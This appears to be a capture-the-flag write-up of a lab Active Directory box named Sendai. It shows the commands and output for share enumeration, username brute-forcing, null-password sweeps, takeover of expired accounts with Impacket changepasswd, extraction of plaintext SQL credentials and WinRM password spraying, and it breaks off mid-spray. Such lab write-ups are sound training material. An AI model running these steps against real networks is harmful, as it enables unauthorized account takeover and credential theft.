Target : 10.129.234.66

Date : 26/05/2026

```bash
>  echo "10.129.234.66 sendai.htb" | sudo tee -a /etc/hosts  
Please touch the FIDO authenticator.  
10.129.234.66 sendai.htb  
>  sudo nmap -sC -sV -Pn -O -T4 --min-rate=3000 -p- 10.129.234.66
Nmap scan report for sendai.htb (10.129.234.66)  
Host is up (0.072s latency).  
Not shown: 65511 filtered tcp ports (no-response)  
PORT      STATE SERVICE       VERSION  
53/tcp    open  domain        Simple DNS Plus  
80/tcp    open  http          Microsoft IIS httpd 10.0  
| http-methods:    
|_  Potentially risky methods: TRACE  
|_http-server-header: Microsoft-IIS/10.0  
|_http-title: IIS Windows Server  
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-26 06:56:06Z)  
135/tcp   open  msrpc         Microsoft Windows RPC  
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=dc.sendai.vl  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl  
| Not valid before: 2025-08-18T12:30:05  
|_Not valid after:  2026-08-18T12:30:05  
|_ssl-date: TLS randomness does not represent time  
443/tcp   open  ssl/https?  
|_ssl-date: TLS randomness does not represent time  
| ssl-cert: Subject: commonName=dc.sendai.vl  
| Subject Alternative Name: DNS:dc.sendai.vl  
| Not valid before: 2023-07-18T12:39:21  
|_Not valid after:  2024-07-18T00:00:00  
445/tcp   open  microsoft-ds?  
464/tcp   open  kpasswd5?  
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=dc.sendai.vl  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl  
| Not valid before: 2025-08-18T12:30:05  
|_Not valid after:  2026-08-18T12:30:05  
|_ssl-date: TLS randomness does not represent time  
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=dc.sendai.vl  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl  
| Not valid before: 2025-08-18T12:30:05  
|_Not valid after:  2026-08-18T12:30:05  
|_ssl-date: TLS randomness does not represent time  
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)  
|_ssl-date: TLS randomness does not represent time  
| ssl-cert: Subject: commonName=dc.sendai.vl  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl  
| Not valid before: 2025-08-18T12:30:05  
|_Not valid after:  2026-08-18T12:30:05  
3389/tcp  open  ms-wbt-server Microsoft Terminal Services  
| ssl-cert: Subject: commonName=dc.sendai.vl  
| Not valid before: 2026-05-25T06:33:07  
|_Not valid after:  2026-11-24T06:33:07  
| rdp-ntlm-info:    
|   Target_Name: SENDAI  
|   NetBIOS_Domain_Name: SENDAI  
|   NetBIOS_Computer_Name: DC  
|   DNS_Domain_Name: sendai.vl  
|   DNS_Computer_Name: dc.sendai.vl  
|   DNS_Tree_Name: sendai.vl  
|   Product_Version: 10.0.20348  
|_  System_Time: 2026-05-26T06:57:02+00:00  
|_ssl-date: 2026-05-26T06:57:41+00:00; -1s from scanner time.  
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-title: Not Found  
|_http-server-header: Microsoft-HTTPAPI/2.0  
9389/tcp  open  mc-nmf        .NET Message Framing  
49664/tcp open  msrpc         Microsoft Windows RPC  
49667/tcp open  msrpc         Microsoft Windows RPC  
50342/tcp open  msrpc         Microsoft Windows RPC  
50364/tcp open  msrpc         Microsoft Windows RPC  
50437/tcp open  msrpc         Microsoft Windows RPC  
64806/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
64807/tcp open  msrpc         Microsoft Windows RPC  
64824/tcp open  msrpc         Microsoft Windows RPC  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Device type: general purpose  
Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)  
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016  
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)  
No exact OS matches for host (test conditions non-ideal).  
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-time:    
|   date: 2026-05-26T06:57:05  
|_  start_date: N/A  
| smb2-security-mode:    
|   3.1.1:    
|_    Message signing enabled and required  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 147.95 seconds
```

This seems to be an Active Directory box with Kerberos `88/tcp` , DNS `53/tcp`, Windows LDAP `3269/tcp` `636/tcp`, smb2 3.1.1 `445/tcp`, Windows RPC `135/tcp` and NetBIOS `139/tcp` but also http `80/tcp` and https `443/tcp` ports open.

We'll start by adding the DNS Computer Name `dc.sendai.vl` and the Domain name `sendai.vl` to our hosts :

```bash
>  echo "10.129.234.66 sendai.htb dc.sendai.vl sendai.vl" | sudo tee -a /etc/hosts  
Please touch the FIDO authenticator.  
10.129.234.66 sendai.htb dc.sendai.vl sendai.vl
```

Then, we're going to try to enumerate the shares using guest on SMB :

```bash
>  nxc smb 10.129.234.66 -u guest -p '' --shares  
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.66   445    DC               [+] sendai.vl\guest:    
SMB         10.129.234.66   445    DC               [*] Enumerated shares  
SMB         10.129.234.66   445    DC               Share           Permissions     Remark  
SMB         10.129.234.66   445    DC               -----           -----------     ------  
SMB         10.129.234.66   445    DC               ADMIN$                          Remote Admin  
SMB         10.129.234.66   445    DC               C$                              Default share  
SMB         10.129.234.66   445    DC               config                             
SMB         10.129.234.66   445    DC               IPC$            READ            Remote IPC  
SMB         10.129.234.66   445    DC               NETLOGON                        Logon server share    
SMB         10.129.234.66   445    DC               sendai          READ            company share  
SMB         10.129.234.66   445    DC               SYSVOL                          Logon server share    
SMB         10.129.234.66   445    DC               Users           READ
```

We're going to look at sendai, see what we can get, since SYSVOL is unnaccessible and sendai is the name of the target.

```bash
>  smbclient //10.129.234.66/sendai -U guest  
Password for [WORKGROUP\guest]:  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Tue Jul 18 19:31:04 2023  
 ..                                DHS        0  Wed Apr 16 04:55:42 2025  
 hr                                  D        0  Tue Jul 11 14:58:19 2023  
 incident.txt                        A     1372  Tue Jul 18 19:34:15 2023  
 it                                  D        0  Tue Jul 18 15:16:46 2023  
 legal                               D        0  Tue Jul 11 14:58:23 2023  
 security                            D        0  Tue Jul 18 15:17:35 2023  
 transfer                            D        0  Tue Jul 11 15:00:20 2023  
  
               7019007 blocks of size 4096. 1236629 blocks available  
smb: \> get incident.txt  
getting file \incident.txt of size 1372 as incident.txt (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)

smb: \> cd legal  
smb: \legal\> ls  
 .                                   D        0  Tue Jul 11 14:58:23 2023  
 ..                                  D        0  Tue Jul 18 19:31:04 2023  
  
               7019007 blocks of size 4096. 1236692 blocks available
 
smb: \legal\> cd \  
smb: \> ls  
 .                                   D        0  Tue Jul 18 19:31:04 2023  
 ..                                DHS        0  Wed Apr 16 04:55:42 2025  
 hr                                  D        0  Tue Jul 11 14:58:19 2023  
 incident.txt                        A     1372  Tue Jul 18 19:34:15 2023  
 it                                  D        0  Tue Jul 18 15:16:46 2023  
 legal                               D        0  Tue Jul 11 14:58:23 2023  
 security                            D        0  Tue Jul 18 15:17:35 2023  
 transfer                            D        0  Tue Jul 11 15:00:20 2023  
  
               7019007 blocks of size 4096. 1236691 blocks available  
smb: \> cd transfer  
smb: \transfer\> ls  
 .                                   D        0  Tue Jul 11 15:00:20 2023  
 ..                                  D        0  Tue Jul 18 19:31:04 2023  
 anthony.smith                       D        0  Tue Jul 11 14:59:50 2023  
 clifford.davey                      D        0  Tue Jul 11 15:00:06 2023  
 elliot.yates                        D        0  Tue Jul 11 14:59:26 2023  
 lisa.williams                       D        0  Tue Jul 11 14:59:34 2023  
 susan.harper                        D        0  Tue Jul 11 14:59:39 2023  
 temp                                D        0  Tue Jul 11 15:00:16 2023  
 thomas.powell                       D        0  Tue Jul 11 14:59:45 2023  
  
              7019007 blocks of size 4096. 1236691 blocks available              
```

We got a bunch of names.

```bash
smb: \transfer\susan.harper\> cd \  
smb: \> ls  
 .                                   D        0  Tue Jul 18 19:31:04 2023  
 ..                                DHS        0  Wed Apr 16 04:55:42 2025  
 hr                                  D        0  Tue Jul 11 14:58:19 2023  
 incident.txt                        A     1372  Tue Jul 18 19:34:15 2023  
 it                                  D        0  Tue Jul 18 15:16:46 2023  
 legal                               D        0  Tue Jul 11 14:58:23 2023  
 security                            D        0  Tue Jul 18 15:17:35 2023  
 transfer                            D        0  Tue Jul 11 15:00:20 2023  
  
               7019007 blocks of size 4096. 1236669 blocks available  
smb: \> cd security  
smb: \security\> ls  
 .                                   D        0  Tue Jul 18 15:17:35 2023  
 ..                                  D        0  Tue Jul 18 19:31:04 2023  
 guidelines.txt                      A     4538  Tue Jul 18 15:18:34 2023  
  
               7019007 blocks of size 4096. 1236669 blocks available  
smb: \security\> get guidelines.txt  
getting file \security\guidelines.txt of size 4538 as guidelines.txt (14.6 KiloBytes/sec) (average 3.6 KiloBytes/sec)
```

So, we'll read `incident.txt`, `guidelines.txt` and create a users list that we'll then anarchize for later.

```
>  cat guidelines.txt  
Company: Sendai  
User Behavior Guidelines  
  
Effective Date: [Insert Date]  
Version: 1.0  
  
Table of Contents:  
  
Introduction  
  
General Guidelines  
  
Security Guidelines  
  
Internet and Email Usage Guidelines  
  
Data Management Guidelines  
  
Software Usage Guidelines  
  
Hardware Usage Guidelines  
  
Conclusion

Introduction:  
  
These User Behavior Guidelines are established to ensure the efficient and secure use of information technology resources within Sendai. By adhering to these guidelines, users can contribute to maintaining a pr  
oductive and secure IT environment. It is the responsibility of every employee to read, understand, and follow these guidelines.  
  
General Guidelines:  
2.1. Password Security:  
a. Users must choose strong passwords that are difficult to guess.  
b. Passwords should be changed regularly and not shared with others.  
c. Users should never write down their passwords or store them in easily accessible locations.  
  
2.2. User Accounts:  
a. Users must not share their user accounts with others.  
b. Each user is responsible for any activities carried out using their account.  
  
2.3. Reporting Incidents:  
a. Users must promptly report any suspected security incidents or unauthorized access to the IT department.  
b. Users should report any IT-related issues to the IT support team for resolution.  
  
2.4. Physical Security:  
a. Users should not leave their workstations unlocked and unattended.  
b. Confidential information and sensitive documents should be stored securely.  
  
Security Guidelines:  
3.1. Malicious Software:  
a. Users must not download or install unauthorized software on company devices.  
b. Users should regularly update their devices with the latest security patches and antivirus software.  
  
3.2. Social Engineering:  
a. Users should be cautious of phishing emails, phone calls, or messages.  
b. Users must not share sensitive information or credentials through untrusted channels.  
  
3.3. Data Backup:  
a. Users should regularly back up their important files and data.  
b. Critical data should be stored on secure network drives or cloud storage.  
  
Internet and Email Usage Guidelines:  
4.1. Acceptable Use:  
a. Internet and email usage should be for work-related purposes.  
b. Users must not access or download inappropriate or unauthorized content.  
  
4.2. Email Etiquette:  
a. Users should maintain professionalism in all email communications.  
b. Users should avoid forwarding chain emails or unauthorized attachments.  
  
4.3. Email Security:  
a. Users should exercise caution when opening email attachments or clicking on links from unknown sources.  
b. Confidential information must not be sent via unencrypted email.  
  
Data Management Guidelines:  
5.1. Data Classification:  
a. Users must classify data according to its sensitivity level.  
b. Users should handle and store sensitive data in accordance with the company's data protection policies.  
  
5.2. Data Privacy:  
a. Users must respect the privacy of personal and sensitive information.  
b. Unauthorized disclosure or sharing of personal data is strictly prohibited.  
  
Software Usage Guidelines:  
6.1. Authorized Software:  
a. Users must only use authorized software and adhere to licensing agreements.  
b. Users should not install or use unauthorized or pirated software.  
  
6.2. Software Updates:  
a. Users should regularly update their software to benefit from the latest features and security patches.  
b. Automatic updates should be enabled whenever possible.  
  
Hardware Usage Guidelines:  
7.1. Equipment Care:  
a. Users should handle company hardware with care and report any damages or malfunctions promptly.  
b. Users must not attempt to repair or modify company equipment without proper authorization.  
  
7.2. Personal Devices:  
a. Users should not connect personal devices to the company network without prior approval from the IT department.  
b. Personal devices used for work purposes must comply with company security policies.  
  
Conclusion:  
By following these User Behavior Guidelines, Sendai employees contribute to the overall security, productivity, and effectiveness of the company's IT infrastructure. Users should regularly review these guidelin  
es and seek clarification from the IT department whenever necessary.  
  
Failure to comply with these guidelines may result in disciplinary action, including the suspension of IT privileges or other appropriate measures.  
  
For any questions or concerns regarding these guidelines, please contact the IT department at [Contact Information].
```

So, a classic guidelines template for the IT at the "Sendai" company.

```
>  cat incident.txt  
Dear valued employees,  
  
We hope this message finds you well. We would like to inform you about an important security update regarding user account passwords. Recently, we conducted a thorough penetration test, which revealed that a significant number of user accounts have weak and insecure passwords.  
  
To address this concern and maintain the highest level of security within our organization, the IT department has taken immediate action. All user accounts with insecure passwords have been expired as a precaut  
ionary measure. This means that affected users will be required to change their passwords upon their next login.  
  
We kindly request all impacted users to follow the password reset process promptly to ensure the security and integrity of our systems. Please bear in mind that strong passwords play a crucial role in safeguard  
ing sensitive information and protecting our network from potential threats.  
  
If you need assistance or have any questions regarding the password reset procedure, please don't hesitate to reach out to the IT support team. They will be more than happy to guide you through the process and  
provide any necessary support.  
  
Thank you for your cooperation and commitment to maintaining a secure environment for all of us. Your vigilance and adherence to robust security practices contribute significantly to our collective safety.
```

So weak and insecure passwords, that means the `guidelines.txt` template wasn't complete `[Insert Date]` and `[Contact Information]`  lets us think that the issues with weak credentials haven't been solved yet inside the Sendai company.

Now, we'll do the user list and anarchize it :

```bash
>  sudo nano sendaiusers.txt
>  sudo username-anarchy -i /home/vagabond/sendaiusers.txt --select-format first,flast,first.last,firstl,FirstLast,last.first | sort -u > asendaiusers.txt  
>  cat asendaiusers.txt  
anthony  
anthonys  
anthony.smith  
anthonysmith  
asmith  
cdavey  
clifford  
cliffordd  
clifford.davey  
clifforddavey  
davey.clifford  
elliot  
ellioty  
elliot.yates  
elliotyates  
eyates  
harper.susan  
lisa  
lisaw  
lisa.williams  
lisawilliams  
lwilliams  
powell.thomas  
sharper  
smith.anthony  
susan  
susanh  
susan.harper  
susanharper  
thomas  
thomasp  
thomas.powell  
thomaspowell  
tpowell  
williams.lisa  
yates.elliot
```

So we got a pretty good AD list. Now what ?
We'll curl the website since `http` and `https` are open.

```bash
>  curl -sI http://10.129.234.66 | head -30  
HTTP/1.1 200 OK  
Content-Length: 703  
Content-Type: text/html  
Last-Modified: Tue, 11 Jul 2023 09:27:12 GMT  
Accept-Ranges: bytes  
ETag: "4692c5dfd9b3d91:0"  
Server: Microsoft-IIS/10.0  
X-Powered-By: ASP.NET  
Date: Tue, 26 May 2026 07:38:41 GMT
```

We can see that it's running under Windows 10 and the webapp is powered by Microsoft ASP.NET, now we'll try to kerbrute with the user list :

```bash
>  kerbrute userenum -d sendai.vl --dc 10.129.234.66 asendaiusers.txt  
  
   __             __               __        
  / /_____  _____/ /_  _______  __/ /____    
 / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \  
/ ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/  
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                           
  
Version: dev (n/a) - 05/26/26 - Ronnie Flathers @ropnop  
  
2026/05/26 09:51:42 >  Using KDC(s):  
2026/05/26 09:51:42 >   10.129.234.66:88  
  
2026/05/26 09:51:42 >  [+] VALID USERNAME:       anthony.smith@sendai.vl  
2026/05/26 09:51:42 >  [+] VALID USERNAME:       clifford.davey@sendai.vl  
2026/05/26 09:51:42 >  [+] VALID USERNAME:       lisa.williams@sendai.vl  
2026/05/26 09:51:42 >  [+] VALID USERNAME:       elliot.yates@sendai.vl  
2026/05/26 09:51:42 >  [+] VALID USERNAME:       susan.harper@sendai.vl  
2026/05/26 09:51:42 >  [+] VALID USERNAME:       thomas.powell@sendai.vl  
2026/05/26 09:51:42 >  Done! Tested 36 usernames (6 valid) in 0.347 seconds
```

So we got everyone's @ username. It's just the literal usernames found in the SMB shares, so the anarchy was suboptimal.

Now, we'll enumerate RIDs/SIDs :

```bash
>  nxc smb dc.sendai.vl -u guest -p '' --rid-brute 10000 | tee rid_brute_sendai.txt  
  
SMB                      10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB                      10.129.234.66   445    DC               [+] sendai.vl\guest:    
SMB                      10.129.234.66   445    DC               498: SENDAI\Enterprise Read-only Domain Controllers (SidTypeGroup)  
SMB                      10.129.234.66   445    DC               500: SENDAI\Administrator (SidTypeUser)  
SMB                      10.129.234.66   445    DC               501: SENDAI\Guest (SidTypeUser)  
SMB                      10.129.234.66   445    DC               502: SENDAI\krbtgt (SidTypeUser)  
SMB                      10.129.234.66   445    DC               512: SENDAI\Domain Admins (SidTypeGroup)  
SMB                      10.129.234.66   445    DC               513: SENDAI\Domain Users (SidTypeGroup)  
SMB                      10.129.234.66   445    DC               514: SENDAI\Domain Guests (SidTypeGroup)  
SMB                      10.129.234.66   445    DC               515: SENDAI\Domain Computers (SidTypeGroup)  
SMB                      10.129.234.66   445    DC               516: SENDAI\Domain Controllers (SidTypeGroup)  
SMB                      10.129.234.66   445    DC               517: SENDAI\Cert Publishers (SidTypeAlias)  
SMB                      10.129.234.66   445    DC               518: SENDAI\Schema Admins (SidTypeGroup)  
SMB                      10.129.234.66   445    DC               519: SENDAI\Enterprise Admins (SidTypeGroup)  
SMB                      10.129.234.66   445    DC               520: SENDAI\Group Policy Creator Owners (SidTypeGroup)  
SMB                      10.129.234.66   445    DC               521: SENDAI\Read-only Domain Controllers (SidTypeGroup)  
SMB                      10.129.234.66   445    DC               522: SENDAI\Cloneable Domain Controllers (SidTypeGroup)  
SMB                      10.129.234.66   445    DC               525: SENDAI\Protected Users (SidTypeGroup)  
SMB                      10.129.234.66   445    DC               526: SENDAI\Key Admins (SidTypeGroup)  
SMB                      10.129.234.66   445    DC               527: SENDAI\Enterprise Key Admins (SidTypeGroup)  
SMB                      10.129.234.66   445    DC               553: SENDAI\RAS and IAS Servers (SidTypeAlias)  
SMB                      10.129.234.66   445    DC               571: SENDAI\Allowed RODC Password Replication Group (SidTypeAlias)  
SMB                      10.129.234.66   445    DC               572: SENDAI\Denied RODC Password Replication Group (SidTypeAlias)  
SMB                      10.129.234.66   445    DC               1000: SENDAI\DC$ (SidTypeUser)  
SMB                      10.129.234.66   445    DC               1101: SENDAI\DnsAdmins (SidTypeAlias)  
SMB                      10.129.234.66   445    DC               1102: SENDAI\DnsUpdateProxy (SidTypeGroup)  
SMB                      10.129.234.66   445    DC               1103: SENDAI\SQLServer2005SQLBrowserUser$DC (SidTypeAlias)  
SMB                      10.129.234.66   445    DC               1104: SENDAI\sqlsvc (SidTypeUser)  
SMB                      10.129.234.66   445    DC               1105: SENDAI\websvc (SidTypeUser)  
SMB                      10.129.234.66   445    DC               1107: SENDAI\staff (SidTypeGroup)  
SMB                      10.129.234.66   445    DC               1108: SENDAI\Dorothy.Jones (SidTypeUser)  
SMB                      10.129.234.66   445    DC               1109: SENDAI\Kerry.Robinson (SidTypeUser)  
SMB                      10.129.234.66   445    DC               1110: SENDAI\Naomi.Gardner (SidTypeUser)  
SMB                      10.129.234.66   445    DC               1111: SENDAI\Anthony.Smith (SidTypeUser)  
SMB                      10.129.234.66   445    DC               1112: SENDAI\Susan.Harper (SidTypeUser)  
SMB                      10.129.234.66   445    DC               1113: SENDAI\Stephen.Simpson (SidTypeUser)  
SMB                      10.129.234.66   445    DC               1114: SENDAI\Marie.Gallagher (SidTypeUser)  
SMB                      10.129.234.66   445    DC               1115: SENDAI\Kathleen.Kelly (SidTypeUser)  
SMB                      10.129.234.66   445    DC               1116: SENDAI\Norman.Baxter (SidTypeUser)  
SMB                      10.129.234.66   445    DC               1117: SENDAI\Jason.Brady (SidTypeUser)  
SMB                      10.129.234.66   445    DC               1118: SENDAI\Elliot.Yates (SidTypeUser)  
SMB                      10.129.234.66   445    DC               1119: SENDAI\Malcolm.Smith (SidTypeUser)  
SMB                      10.129.234.66   445    DC               1120: SENDAI\Lisa.Williams (SidTypeUser)  
SMB                      10.129.234.66   445    DC               1121: SENDAI\Ross.Sullivan (SidTypeUser)  
SMB                      10.129.234.66   445    DC               1122: SENDAI\Clifford.Davey (SidTypeUser)  
SMB                      10.129.234.66   445    DC               1123: SENDAI\Declan.Jenkins (SidTypeUser)  
SMB                      10.129.234.66   445    DC               1124: SENDAI\Lawrence.Grant (SidTypeUser)  
SMB                      10.129.234.66   445    DC               1125: SENDAI\Leslie.Johnson (SidTypeUser)  
SMB                      10.129.234.66   445    DC               1126: SENDAI\Megan.Edwards (SidTypeUser)  
SMB                      10.129.234.66   445    DC               1127: SENDAI\Thomas.Powell (SidTypeUser)  
SMB                      10.129.234.66   445    DC               1128: SENDAI\ca-operators (SidTypeGroup)  
SMB                      10.129.234.66   445    DC               1129: SENDAI\admsvc (SidTypeGroup)  
SMB                      10.129.234.66   445    DC               1130: SENDAI\mgtsvc$ (SidTypeUser)  
SMB                      10.129.234.66   445    DC               1131: SENDAI\support (SidTypeGroup)
```

Then, we use `ripgrep` and `awk {print $6}` to grep this and grab the 6th column which is the `SENDAI\name` column, and we'll cut it by taking the second section ( the `names`) with `cut -d '\' f2` and only keep the `usernames` and exclude the `groups` and `aliases` by filtering with "SidTypeUser" :

```bash
>  rg "SidTypeUser" rid_brute_sendai.txt | awk '{print $6}' | cut -d '\' -f2 | sort -u > sendai_users.txt
```

Then, we do a null password sweep :

```bash
>  nxc smb dc.sendai.vl -u sendai_users.txt -p '' --continue-on-success | tee smb_empty_state_check.txt  
  
SMB                      10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB                      10.129.234.66   445    DC               [-] sendai.vl\Administrator: STATUS_LOGON_FAILURE    
SMB                      10.129.234.66   445    DC               [-] sendai.vl\Anthony.Smith: STATUS_LOGON_FAILURE    
SMB                      10.129.234.66   445    DC               [-] sendai.vl\Clifford.Davey: STATUS_LOGON_FAILURE    
SMB                      10.129.234.66   445    DC               [-] sendai.vl\DC$: STATUS_LOGON_FAILURE    
SMB                      10.129.234.66   445    DC               [-] sendai.vl\Declan.Jenkins: STATUS_LOGON_FAILURE    
SMB                      10.129.234.66   445    DC               [-] sendai.vl\Dorothy.Jones: STATUS_LOGON_FAILURE    
SMB                      10.129.234.66   445    DC               [-] sendai.vl\Elliot.Yates: STATUS_PASSWORD_MUST_CHANGE    
SMB                      10.129.234.66   445    DC               [+] sendai.vl\Guest:    
SMB                      10.129.234.66   445    DC               [-] sendai.vl\Jason.Brady: STATUS_LOGON_FAILURE    
SMB                      10.129.234.66   445    DC               [-] sendai.vl\Kathleen.Kelly: STATUS_LOGON_FAILURE    
SMB                      10.129.234.66   445    DC               [-] sendai.vl\Kerry.Robinson: STATUS_LOGON_FAILURE    
SMB                      10.129.234.66   445    DC               [-] sendai.vl\krbtgt: STATUS_LOGON_FAILURE    
SMB                      10.129.234.66   445    DC               [-] sendai.vl\Lawrence.Grant: STATUS_LOGON_FAILURE    
SMB                      10.129.234.66   445    DC               [-] sendai.vl\Leslie.Johnson: STATUS_LOGON_FAILURE    
SMB                      10.129.234.66   445    DC               [-] sendai.vl\Lisa.Williams: STATUS_LOGON_FAILURE    
SMB                      10.129.234.66   445    DC               [-] sendai.vl\Malcolm.Smith: STATUS_LOGON_FAILURE    
SMB                      10.129.234.66   445    DC               [-] sendai.vl\Marie.Gallagher: STATUS_LOGON_FAILURE    
SMB                      10.129.234.66   445    DC               [-] sendai.vl\Megan.Edwards: STATUS_LOGON_FAILURE    
SMB                      10.129.234.66   445    DC               [-] sendai.vl\mgtsvc$: STATUS_LOGON_FAILURE    
SMB                      10.129.234.66   445    DC               [-] sendai.vl\Naomi.Gardner: STATUS_LOGON_FAILURE    
SMB                      10.129.234.66   445    DC               [-] sendai.vl\Norman.Baxter: STATUS_LOGON_FAILURE    
SMB                      10.129.234.66   445    DC               [-] sendai.vl\Ross.Sullivan: STATUS_LOGON_FAILURE    
SMB                      10.129.234.66   445    DC               [-] sendai.vl\sqlsvc: STATUS_LOGON_FAILURE    
SMB                      10.129.234.66   445    DC               [-] sendai.vl\Stephen.Simpson: STATUS_LOGON_FAILURE    
SMB                      10.129.234.66   445    DC               [-] sendai.vl\Susan.Harper: STATUS_LOGON_FAILURE    
SMB                      10.129.234.66   445    DC               [-] sendai.vl\Thomas.Powell: STATUS_PASSWORD_MUST_CHANGE    
SMB                      10.129.234.66   445    DC               [-] sendai.vl\websvc: STATUS_LOGON_FAILURE
```

We can see that for Thomas.Powell and Elliot.Yates, `STATUS_PASSWORD_MUST_CHANGE` is indicated, meaning the `guidelines.txt` haven't been followed by those two users and that the pentest conducted on Sendai per the `incident.txt` must have detected weak credentials for these two users.

We'll use Impacket's `changepasswd` for the two users :

```bash
>  changepasswd.py 'sendai.vl/Thomas.Powell'@dc.sendai.vl -newpass 'ScrowSendaiXYZ1'  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
Current password:    
[*] Changing the password of sendai.vl\Thomas.Powell  
[*] Connecting to DCE/RPC as sendai.vl\Thomas.Powell  
[!] Password is expired or must be changed, trying to bind with a null session.  
[*] Connecting to DCE/RPC as null session  
[*] Password was changed successfully.

>  changepasswd.py 'sendai.vl/Elliot.Yates'@dc.sendai.vl -newpass 'ScrowSendaiXYZ1'  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
Current password:    
[*] Changing the password of sendai.vl\Elliot.Yates  
[*] Connecting to DCE/RPC as sendai.vl\Elliot.Yates  
[!] Password is expired or must be changed, trying to bind with a null session.  
[*] Connecting to DCE/RPC as null session  
[*] Password was changed successfully.
```

We then verify the login and the rights on shares on Thomas.Powell :

```bash
>  nxc smb dc.sendai.vl -u Thomas.Powell -p 'ScrowSendaiXYZ1' --shares  
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.66   445    DC               [+] sendai.vl\Thomas.Powell:ScrowSendaiXYZ1    
SMB         10.129.234.66   445    DC               [*] Enumerated shares  
SMB         10.129.234.66   445    DC               Share           Permissions     Remark  
SMB         10.129.234.66   445    DC               -----           -----------     ------  
SMB         10.129.234.66   445    DC               ADMIN$                          Remote Admin  
SMB         10.129.234.66   445    DC               C$                              Default share  
SMB         10.129.234.66   445    DC               config          READ,WRITE         
SMB         10.129.234.66   445    DC               IPC$            READ            Remote IPC  
SMB         10.129.234.66   445    DC               NETLOGON        READ            Logon server share    
SMB         10.129.234.66   445    DC               sendai          READ,WRITE      company share  
SMB         10.129.234.66   445    DC               SYSVOL          READ            Logon server share    
SMB         10.129.234.66   445    DC               Users           READ
```

We see that we have `READ` and `WRITE` permissions on `config` and `sendai` and `READ` permissions on `NETLOGON`, `SYSVOL` and `IPC$` that we didn't have as `guest`.

```bash
>  smbclient //10.129.234.66/config -U Thomas.Powell  
Password for [WORKGROUP\Thomas.Powell]:  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Tue May 26 10:29:19 2026  
 ..                                DHS        0  Wed Apr 16 04:55:42 2025  
 .sqlconfig                          A       78  Tue Jul 11 14:57:11 2023  
  
               7019007 blocks of size 4096. 1235487 blocks available  
smb: \> get .sqlconfig  
getting file \.sqlconfig of size 78 as .sqlconfig (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)  
smb: \> get sqlconfig
smb: \> exit
>  cat .sqlconfig  
Server=dc.sendai.vl,1433;Database=prod;User Id=sqlsvc;Password=SurenessBlob85;%
```

We found credentials, we'll try them with winrm as `sqlsvc` with different variants, then with the sendai_users.txt users, but it doesn't seem to work.

```bash                                                                         >>  nxc winrm 10.129.234.66 -u sqlsvc -p 'SurenessBlob85'  
WINRM       10.129.234.66   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl)    
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\sqlsvc:SurenessBlob85  
>  nxc winrm 10.129.234.66 -u sqlsvc -p 'SurenessBlob85;%'  
WINRM       10.129.234.66   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl)    
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\sqlsvc:SurenessBlob85;%  
>  nxc winrm 10.129.234.66 -u sqlsvc -p 'SurenessBlob85'  
WINRM       10.129.234.66   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl)    
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\sqlsvc:SurenessBlob85  
>  nxc winrm 10.129.234.66 -u sendai_users.txt -p 'SurenessBlob85'  
